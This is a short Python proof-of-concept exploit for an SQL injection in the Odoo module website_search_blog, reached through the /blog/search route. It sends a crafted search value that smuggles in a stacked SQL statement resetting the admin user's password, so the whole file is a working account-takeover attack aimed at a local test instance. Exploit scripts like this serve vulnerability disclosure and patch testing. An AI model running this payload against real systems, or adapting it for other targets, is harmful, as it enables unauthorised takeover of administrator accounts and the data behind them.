# Exploit
# Copyright (c) 2023 Lucas Visintin
# Odoo Module: website_search_blog
# SQL injection vulnerability in website_search_blog/controllers/main.py:RecruitmentInherit::search_contents(**kw)
# Reachable from route /blog/search

import requests

url = 'http://localhost:8073/blog/search'

data = {
    "name": "dev'; UPDATE res_users SET password='whatever' WHERE login='admin';  select id as res_id, name as name, name as value from blog_post where name ILIKE 'dev"
}

response = requests.post(url=url, data=data)
print(response.json())
